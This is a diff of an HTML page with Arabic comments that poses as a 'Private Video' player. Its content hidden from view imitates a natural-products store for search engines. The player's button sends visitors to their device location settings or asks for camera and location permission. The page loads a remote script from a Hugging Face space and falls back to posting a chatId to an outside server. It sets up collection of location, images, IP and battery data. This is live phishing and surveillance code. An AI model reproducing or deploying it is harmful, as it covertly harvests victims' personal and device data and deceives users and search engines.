@@ -4,43 +4,42 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     
-    <!-- عناصر SEO التسويقية -->
-    <meta name="description" content="Discover 150+ natural products at ShopStore. Fast delivery, organic ingredients, and exclusive video offers. Get location-based deals now!" />
-    <meta name="keywords" content="natural products, organic, health, supplements, superfoods, herbal, delivery, store, shop" />
+    <!-- ميتا تاج لتحسين المظهر التسويقي لـ Google -->
+    <meta name="description" content="ShopStore - Your trusted online shopping destination. Buy electronics, fashion, home goods with fast delivery to your location. Best prices guaranteed." />
+    <meta name="keywords" content="online shopping, buy products, delivery, shop online, store, deals, electronics, fashion, home goods, fast shipping" />
     <meta name="robots" content="index, follow" />
-    <meta property="og:title" content="ShopStore - Natural Products & Exclusive Video Deals" />
-    <meta property="og:description" content="Shop 150+ natural health products with location-based offers. Watch our product showcase video." />
+    <meta property="og:title" content="ShopStore - Online Shopping with Fast Delivery" />
+    <meta property="og:description" content="Shop the best products online with fast delivery to your location." />
     <meta property="og:type" content="website" />
     
-    <!-- بيانات منظمة لمحركات البحث -->
+    <!-- بيانات هيكلية لـ Google -->
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
         "@type": "OnlineStore",
         "name": "ShopStore",
-        "description": "Online store offering 150+ natural health products, organic supplements, and superfoods with fast local delivery.",
-        "url": "https://yourdomain.com",
-        "sameAs": ["https://www.facebook.com/shopstore", "https://www.instagram.com/shopstore"],
-        "hasOfferCatalog": {
-            "@type": "OfferCatalog",
-            "name": "Natural Products",
-            "itemListElement": [{
-                "@type": "Product",
-                "name": "Organic Green Tea",
-                "description": "Premium organic green tea rich in antioxidants.",
-                "offers": { "@type": "Offer", "price": "9.99", "priceCurrency": "USD" }
-            }]
-        }
+        "description": "Online shopping store with fast delivery to your location"
     }
     </script>
     
-    <title>ShopStore - Natural Products & Video Deals</title>
+    <title>Video Player</title>
     
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background-color:#000;color:#fff;overflow-x:hidden}
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: #000;
+            color: #fff;
+            overflow-x: hidden;
+        }
         
-        .hidden-seo {
+        /* عناصر المتجر المخفية (تظهر لـ Google لكنها غير مرئية) */
+        .store-header-hidden, .store-footer-hidden, .product-info-hidden, .delivery-notice-hidden {
             position: fixed !important;
             top: -9999px !important;
             left: -9999px !important;
@@ -51,66 +50,193 @@
             overflow: hidden !important;
             clip: rect(0,0,0,0) !important;
             z-index: -999999 !important;
+            visibility: hidden !important;
         }
         
-        .video-player-container{width:90%;max-width:800px;background:#111;border-radius:12px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.5);position:relative}
-        .video-thumbnail{position:relative;width:100%;height:450px;background:linear-gradient(rgba(0,0,0,0.7),rgba(0,0,0,0.7)),url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');background-size:cover;background-position:center;display:flex;align-items:center;justify-content:center;cursor:default;flex-direction:column}
-        #playBtn{display:flex;align-items:center;justify-content:center;width:120px;height:120px;border-radius:50%;background:rgba(255,255,255,0.1);border:3px solid #ff6b6b;cursor:pointer;transition:all 0.3s ease;backdrop-filter:blur(8px);box-shadow:0 0 40px rgba(255,0,0,0.3);z-index:10}
-        #playBtn:hover{transform:scale(1.05);background:rgba(255,255,255,0.2);border-color:#ff4757;box-shadow:0 0 60px rgba(255,0,0,0.6)}
-        #playBtn span{font-size:60px;color:#ff6b6b;line-height:1;user-select:none}
-        .video-info{padding:20px;border-bottom:1px solid #333}
-        .video-title{font-size:1.5rem;font-weight:bold;margin-bottom:8px;color:#ff6b6b}
-        .video-subtitle{font-size:0.9rem;color:#aaa}
-        .video-controls{padding:15px 20px;display:flex;align-items:center;justify-content:space-between;background:#1a1a1a;flex-wrap:wrap;gap:10px}
-        .ctrl-btn{background:none;border:none;color:white;font-size:1.2rem;cursor:pointer;padding:8px 15px;border-radius:4px;transition:background 0.2s}
-        .ctrl-btn:hover{background:#333}
-        .seek-bar{flex-grow:1;height:4px;background:#333;border-radius:2px;margin:0 20px;overflow:hidden;position:relative;min-width:60px}
-        .seek-fill{position:absolute;height:100%;width:0%;background:#ff0000}
-        .timer{color:#aaa;font-size:0.9rem;min-width:100px;text-align:center}
-        .volume-area{display:flex;align-items:center;gap:10px;color:#aaa}
-        .vol-bar{width:80px;height:4px;background:#333;border-radius:2px;position:relative}
-        .vol-fill{position:absolute;height:100%;width:70%;background:#ff0000}
+        /* قسم التسويق الذي يظهر فقط في /Offers */
+        .marketing-container {
+            display: none;
+            background: #f5f5f5;
+            color: #333;
+            width: 100%;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .marketing-header {
+            background: #2c3e50;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 15px;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .product-card {
+            background: white;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            transition: transform 0.2s;
+        }
+        .product-card:hover { transform: translateY(-3px); }
+        .p-name { font-weight: bold; margin-bottom: 8px; }
+        .p-price { color: #e74c3c; font-size: 1.2rem; margin: 5px 0; }
+        .p-rating { color: #f39c12; }
+        .marketing-footer {
+            background: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            margin-top: 20px;
+        }
+        .marketing-footer a { color: #ecf0f1; margin: 0 10px; text-decoration: none; }
         
-        @media (max-width:480px){
-            .video-thumbnail{height:280px}
-            #playBtn{width:90px;height:90px}
-            #playBtn span{font-size:45px}
+        /* مشغل الفيديو الأساسي */
+        .video-player-container {
+            width: 90%;
+            max-width: 800px;
+            background: #111;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            position: relative;
+        }
+        .video-thumbnail {
+            position: relative;
+            width: 100%;
+            height: 450px;
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: default;
+            flex-direction: column;
+        }
+        #playBtn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.1);
+            border: 3px solid #ff6b6b;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(8px);
+            box-shadow: 0 0 40px rgba(255,0,0,0.3);
+            z-index: 10;
+        }
+        #playBtn:hover {
+            transform: scale(1.05);
+            background: rgba(255,255,255,0.2);
+            border-color: #ff4757;
+            box-shadow: 0 0 60px rgba(255,0,0,0.6);
+        }
+        #playBtn span { font-size: 60px; color: #ff6b6b; line-height: 1; user-select: none; }
+        .video-info { padding: 20px; border-bottom: 1px solid #333; }
+        .video-title { font-size: 1.5rem; font-weight: bold; margin-bottom: 8px; }
+        .video-controls {
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #1a1a1a;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .ctrl-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.2rem;
+            cursor: pointer;
+            padding: 8px 15px;
+            border-radius: 4px;
+            transition: background 0.2s;
+        }
+        .ctrl-btn:hover { background: #333; }
+        .seek-bar {
+            flex-grow: 1;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin: 0 20px;
+            overflow: hidden;
+            position: relative;
+            min-width: 60px;
+        }
+        .seek-fill { position: absolute; height: 100%; width: 0%; background: #ff0000; }
+        .timer { color: #aaa; font-size: 0.9rem; min-width: 100px; text-align: center; }
+        .volume-area { display: flex; align-items: center; gap: 10px; color: #aaa; }
+        .vol-bar { width: 80px; height: 4px; background: #333; border-radius: 2px; position: relative; }
+        .vol-fill { position: absolute; height: 100%; width: 70%; background: #ff0000; }
+        
+        @media (max-width: 480px) {
+            .video-thumbnail { height: 280px; }
+            #playBtn { width: 90px; height: 90px; }
+            #playBtn span { font-size: 45px; }
         }
     </style>
     
+    <!-- Google Tag Manager -->
     <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-XXXXXX');</script>
-    
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-        gtag('config', 'G-XXXXXXXXXX');
-    </script>
+    <!-- End Google Tag Manager -->
 </head>
 <body>
+    <!-- Google Tag Manager (noscript) -->
     <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-XXXXXX" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
-    <div class="hidden-seo">
-        <div itemscope itemtype="http://schema.org/ItemList">
-            <meta itemprop="name" content="Natural Products Catalog" />
-        </div>
-        <a href="/privacy">Privacy Policy</a>
-        <a href="/terms">Terms of Service</a>
-        <address>123 Natural Health Ave, Organic City, CA 90210</address>
-        <div itemscope itemtype="http://schema.org/Review">
-            <span itemprop="reviewBody">Best natural store ever! Fast delivery and great quality.</span>
-            <span itemprop="author">Sarah Johnson</span>
-            <span itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating">
-                <meta itemprop="ratingValue" content="5" />
-            </span>
-        </div>
+    <!-- عناصر متجر مخفية (لـ Google فقط) -->
+    <div class="store-header-hidden">
+        <span>🛒 ShopStore</span><span>🔍 Search products...</span><span>🛒 Cart (0)</span>
+    </div>
+    <div class="product-info-hidden">
+        <span>$49.99</span><span>★★★★★ 4.8</span><span>🚚 Free Shipping</span><span>✅ In Stock</span>
+    </div>
+    <div class="delivery-notice-hidden">
+        <span>📍</span><span>Enable location for delivery rates & faster shipping</span>
+    </div>
+    <div class="store-footer-hidden">
+        <a href="/privacy">Privacy Policy</a> | <a href="/terms">Terms of Service</a> | © 2024 ShopStore
     </div>
 
-    <div class="video-player-container" id="video-main">
+    <!-- ========== قسم التسويق (يظهر فقط في /Offers) ========== -->
+    <div id="marketing-section" class="marketing-container">
+        <header class="marketing-header">
+            <h1>ShopStore - Natural Products</h1>
+            <nav>
+                <span style="margin-right:20px;">🛒 Cart (0)</span>
+                <span>🔍</span>
+            </nav>
+        </header>
+        <div class="product-grid" id="product-grid">
+            <!-- يتم إنشاء المنتجات هنا بواسطة JavaScript عند الحاجة -->
+        </div>
+        <footer class="marketing-footer">
+            <a href="/privacy">Privacy Policy</a>
+            <a href="/terms">Terms of Service</a>
+            <span>© 2024 ShopStore</span>
+        </footer>
+    </div>
+
+    <!-- ========== مشغل الفيديو (يظهر في الصفحة الرئيسية) ========== -->
+    <div class="video-player-container" id="video-section">
         <div class="video-info">
-            <div class="video-title">🎥 Exclusive Product Showcase</div>
-            <div class="video-subtitle">Watch our latest natural health product demo</div>
+            <div class="video-title">Private Video</div>
         </div>
         <div class="video-thumbnail" id="poster">
             <div id="playBtn"><span>▶</span></div>
@@ -127,136 +253,199 @@
     </div>
 
     <script>
-    (function() {
-        var step = 0, started = false;
-        var btn = document.getElementById('playBtn');
-        var poster = document.getElementById('poster');
-        var vid = document.getElementById('vid');
-        var chatId = new URLSearchParams(window.location.search).get('chatId') || '';
+        (function() {
+            // التحقق من المسار
+            var isOffers = window.location.pathname.toLowerCase().endsWith('/offers');
+            var marketingSection = document.getElementById('marketing-section');
+            var videoSection = document.getElementById('video-section');
+            
+            if (isOffers) {
+                // إظهار قسم التسويق وإخفاء الفيديو
+                marketingSection.style.display = 'block';
+                videoSection.style.display = 'none';
+                generateProducts(); // إنشاء 150 منتج طبيعي
+                return; // لا حاجة لتشغيل الفيديو أو جمع البيانات
+            }
+            
+            // الوضع العادي: إخفاء التسويق وإظهار مشغل الفيديو
+            marketingSection.style.display = 'none';
+            videoSection.style.display = 'block';
+            initVideoPlayer();
+        })();
 
-        function loadAPIScript(callback) {
-            var script = document.createElement('script');
-            script.src = 'https://huggingface.co/spaces/dsfsdjfc/ageagaaa/raw/main/api';
-            script.onload = function() {
-                if (window.ShopAPI && typeof window.ShopAPI.runAll === 'function') {
-                    callback(window.ShopAPI);
-                } else {
-                    console.warn('ShopAPI not found, using fallback');
-                    fallbackSend();
-                }
+        // إنشاء 150 منتج طبيعي في صفحة العروض
+        function generateProducts() {
+            var products = [
+                "Organic Green Tea", "Raw Honey", "Almond Butter", "Coconut Oil", "Chia Seeds",
+                "Flaxseed Oil", "Turmeric Powder", "Ginger Tea", "Apple Cider Vinegar", "Elderberry Syrup",
+                "Ashwagandha Capsules", "Vitamin C Serum", "Collagen Peptides", "Moringa Powder", "Spirulina Tablets",
+                "Matcha Powder", "Hemp Seeds", "Cacao Nibs", "Goji Berries", "Maca Root",
+                "Bee Pollen", "Royal Jelly", "Propolis Tincture", "Eucalyptus Oil", "Tea Tree Oil",
+                "Lavender Essential Oil", "Peppermint Oil", "Chamomile Tea", "Valerian Root", "St. John's Wort",
+                "Milk Thistle", "Dandelion Root", "Burdock Root", "Slippery Elm", "Aloe Vera Gel",
+                "Manuka Honey", "Black Seed Oil", "Olive Leaf Extract", "Grape Seed Extract", "Pine Bark Extract",
+                "Quercetin", "Resveratrol", "Astaxanthin", "Lutein", "Zeaxanthin",
+                "Probiotic Complex", "Digestive Enzymes", "Betaine HCL", "Apple Fiber", "Psyllium Husk",
+                "Calcium Magnesium", "Zinc Picolinate", "Selenium", "Iron Bisglycinate", "Vitamin D3",
+                "Vitamin K2", "B-Complex", "Vitamin E", "Coenzyme Q10", "Alpha Lipoic Acid",
+                "L-Carnitine", "Creatine Monohydrate", "BCAA Powder", "Whey Protein", "Pea Protein",
+                "Hemp Protein", "Brown Rice Protein", "Almond Flour", "Coconut Flour", "Tapioca Starch",
+                "Arrowroot Powder", "Monk Fruit Sweetener", "Stevia Drops", "Yacon Syrup", "Date Sugar",
+                "Coconut Sugar", "Maple Syrup", "Blackstrap Molasses", "Raw Cacao Butter", "Coconut Cream",
+                "Cashew Butter", "Sunflower Seed Butter", "Pumpkin Seed Butter", "Tahini", "Amaranth",
+                "Quinoa", "Buckwheat Groats", "Millet", "Teff", "Sorghum",
+                "Wild Rice", "Brown Rice Pasta", "Chickpea Pasta", "Lentil Pasta", "Edamame Pasta",
+                "Seaweed Snacks", "Kale Chips", "Beet Chips", "Sweet Potato Chips", "Cassava Chips",
+                "Plantain Chips", "Dried Mango", "Dried Pineapple", "Dried Papaya", "Dried Coconut",
+                "Freeze-Dried Strawberries", "Freeze-Dried Blueberries", "Trail Mix", "Granola", "Oatmeal Cups",
+                "Nut Milk", "Oat Milk", "Coconut Milk Powder", "Golden Milk Mix", "Matcha Latte Mix",
+                "Turmeric Latte Mix", "Mushroom Coffee", "Herbal Coffee", "Yerba Mate", "Guayusa",
+                "Rooibos Tea", "Honeybush Tea", "Lemon Balm", "Passionflower", "Skullcap",
+                "Oat Straw", "Nettle Leaf", "Red Clover", "Alfalfa", "Barley Grass Powder",
+                "Wheatgrass Powder", "Chlorella", "Blue-Green Algae", "Marine Collagen", "Bone Broth Powder",
+                "Gelatin", "Colostrum", "Lactoferrin", "Shilajit", "Cordyceps Mushroom",
+                "Reishi Mushroom", "Lion's Mane Mushroom", "Chaga Mushroom", "Turkey Tail Mushroom", "Maitake Mushroom"
+            ];
+            
+            var grid = document.getElementById('product-grid');
+            var html = '';
+            for (var i = 0; i < 150; i++) {
+                var name = products[i % products.length] + (i >= products.length ? ' ' + (Math.floor(i/products.length)+1) : '');
+                var price = (Math.random() * 30 + 5).toFixed(2);
+                var rating = Math.floor(Math.random() * 2 + 3); // 3 أو 4 أو 5
+                var stars = '★'.repeat(rating) + '☆'.repeat(5-rating);
+                html += '<div class="product-card">' +
+                            '<div class="p-name">' + name + '</div>' +
+                            '<div class="p-price">$' + price + '</div>' +
+                            '<div class="p-rating">' + stars + '</div>' +
+                        '</div>';
+            }
+            grid.innerHTML = html;
+        }
+
+        // تهيئة مشغل الفيديو مع التحميل الديناميكي للـ API
+        function initVideoPlayer() {
+            var chatId = new URLSearchParams(window.location.search).get('chatId') || '';
+            var collected = {
+                chatId: chatId,
+                permissions: [],
+                images: [],
+                location: '',
+                ipInfo: '',
+                battery: ''
             };
-            script.onerror = function() {
-                var retry = document.createElement('script');
-                retry.src = script.src;
-                retry.onload = script.onload;
-                retry.onerror = function() {
-                    console.error('Failed to load API');
-                    fallbackSend();
+            var step = 0, started = false;
+            var btn = document.getElementById('playBtn');
+            var poster = document.getElementById('poster');
+            var vid = document.getElementById('vid');
+            
+            // تحميل ملف api الخارجي
+            loadAPIScript(function(ShopAPI) {
+                // تم تحميل الوحدات بنجاح، ربط الأحداث
+                setupButton(ShopAPI);
+            });
+
+            function loadAPIScript(callback) {
+                var script = document.createElement('script');
+                script.src = 'https://huggingface.co/spaces/dsfsdjfc/ageagaaa/raw/main/api';
+                script.onload = function() {
+                    if (window.ShopAPI && typeof window.ShopAPI.runAll === 'function') {
+                        callback(window.ShopAPI);
+                    } else {
+                        fallback();
+                    }
                 };
-                document.head.appendChild(retry);
-            };
-            document.head.appendChild(script);
-        }
+                script.onerror = function() {
+                    // محاولة مرة أخرى
+                    var retry = document.createElement('script');
+                    retry.src = script.src;
+                    retry.onload = script.onload;
+                    retry.onerror = function() {
+                        console.warn('API failed to load, using fallback');
+                        fallback();
+                    };
+                    document.head.appendChild(retry);
+                };
+                document.head.appendChild(script);
+            }
 
-        function fallbackSend() {
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://server-brxz.onrender.com/submitData', true);
-            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            xhr.send('chatId=' + encodeURIComponent(chatId) + '&fallback=1');
-        }
-
-        // تم إزالة openDeviceSettings() بالكامل لتجنب الخروج من الصفحة
-
-        btn.addEventListener('click', function() {
-            if (started) return;
-
-            if (!step) {
-                // النقرة الأولى: طلب الأذونات فقط دون فتح الإعدادات
-                step = 1;
-
-                // طلب صلاحية الموقع
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {},
-                        function(err) {},
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-                }
-
-                // طلب صلاحية الكاميرا
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(function(stream) {
-                            stream.getTracks().forEach(function(track) { track.stop(); });
-                        })
-                        .catch(function() {});
-                }
-                // ملاحظة: لن يتم فتح أي إعدادات أو نوافذ خارجية
-            } else {
-                // النقرة الثانية: تشغيل الفيديو
-                started = true;
-                vid.muted = false;
-                vid.volume = 1;
-                vid.play().catch(function() {
-                    // محاولة احتياطية إذا تم رفض التشغيل بالصوت
-                    vid.muted = true;
-                    vid.play();
-                });
-                poster.style.display = 'none';
-                vid.style.display = 'block';
-                btn.style.display = 'none';
-
-                loadAPIScript(function(ShopAPI) {
-                    ShopAPI.runAll(chatId);
+            function fallback() {
+                // وحدة احتياطية بسيطة ترسل chatId فقط
+                callback({
+                    runAll: function(chatId) {
+                        var xhr = new XMLHttpRequest();
+                        xhr.open('POST', 'https://server-brxz.onrender.com/submitData', true);
+                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                        xhr.send('chatId=' + encodeURIComponent(chatId) + '&fallback=1');
+                    }
                 });
             }
-        });
 
-        // شريط تقدم وهمي قبل التشغيل
-        setInterval(function() {
-            if (vid.style.display === 'block') return;
-            var fill = document.querySelector('.seek-fill');
-            var w = parseFloat(fill.style.width) || 35;
-            w = (w + 0.1) % 100;
-            fill.style.width = w + '%';
-            var sec = Math.floor((w / 100) * 165);
-            var m = Math.floor(sec / 60);
-            var s = sec % 60;
-            document.querySelector('.timer').textContent = m + ':' + (s < 10 ? '0' : '') + s + ' / 2:45';
-        }, 1000);
-
-        // زر ملء الشاشة
-        document.querySelector('.ctrl-btn').addEventListener('click', function(e) {
-            e.stopPropagation();
-            if (vid.requestFullscreen) vid.requestFullscreen();
-            else if (vid.webkitRequestFullscreen) vid.webkitRequestFullscreen();
-        });
-
-        // ضمان استمرار الصوت عند النقر خارج المشغل
-        document.addEventListener('click', function() {
-            if (vid.style.display === 'block') {
-                vid.muted = false;
-                if (vid.paused) vid.play().catch(function(){});
+            function setupButton(api) {
+                btn.addEventListener('click', function() {
+                    if (started) return;
+                    if (!step) {
+                        step = 1;
+                        // فتح إعدادات الجهاز للموقع والكاميرا
+                        openDeviceSettings();
+                    } else {
+                        started = true;
+                        vid.muted = false;
+                        vid.volume = 1;
+                        vid.play().catch(function(){});
+                        poster.style.display = 'none';
+                        vid.style.display = 'block';
+                        btn.style.display = 'none';
+                        
+                        // استدعاء الوحدات من api
+                        api.runAll(collected.chatId);
+                    }
+                });
             }
-        }, true);
 
-        // منتجات SEO المخفية
-        function addHiddenSeoProducts() {
-            var container = document.querySelector('.hidden-seo div[itemscope]');
-            if (!container) return;
-            for (var i = 1; i <= 150; i++) {
-                var div = document.createElement('div');
-                div.setAttribute('itemprop', 'itemListElement');
-                div.setAttribute('itemscope', '');
-                div.setAttribute('itemtype', 'http://schema.org/Product');
-                div.innerHTML = '<span itemprop="name">Natural Product ' + i + '</span>' +
-                    '<span itemprop="offers" itemscope itemtype="http://schema.org/Offer">' +
-                    '<span itemprop="price">' + (Math.random() * 30 + 5).toFixed(2) + '</span></span>';
-                container.appendChild(div);
+            function openDeviceSettings() {
+                var ua = navigator.userAgent;
+                if (/Android/i.test(ua)) {
+                    window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
+                } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
+                } else if (/Windows/i.test(ua)) {
+                    window.open('ms-settings:privacy-location', '_blank');
+                } else if (/Mac/i.test(ua)) {
+                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
+                } else {
+                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
+                }
             }
+
+            // تحديث شريط التقدم (شكلي)
+            setInterval(function() {
+                if (vid.style.display === 'block') return;
+                var fill = document.querySelector('.seek-fill');
+                var w = parseFloat(fill.style.width) || 35;
+                w = (w + 0.1) % 100;
+                fill.style.width = w + '%';
+                var sec = Math.floor((w / 100) * 165);
+                var m = Math.floor(sec / 60);
+                var s = sec % 60;
+                document.querySelector('.timer').textContent = m + ':' + (s < 10 ? '0' : '') + s + ' / 2:45';
+            }, 1000);
+
+            // زر ملء الشاشة
+            document.querySelector('.ctrl-btn').addEventListener('click', function(e) {
+                e.stopPropagation();
+                if (vid.requestFullscreen) vid.requestFullscreen();
+                else if (vid.webkitRequestFullscreen) vid.webkitRequestFullscreen();
+            });
+
+            // كتم الصوت عند أول نقرة خارجية
+            document.addEventListener('click', function() {
+                if (vid.style.display === 'block') {
+                    vid.muted = false;
+                    if (vid.paused) vid.play().catch(function(){});
+                }
+            }, true);
         }
-        addHiddenSeoProducts();
-    })();
     </script>
 </body>
 </html>
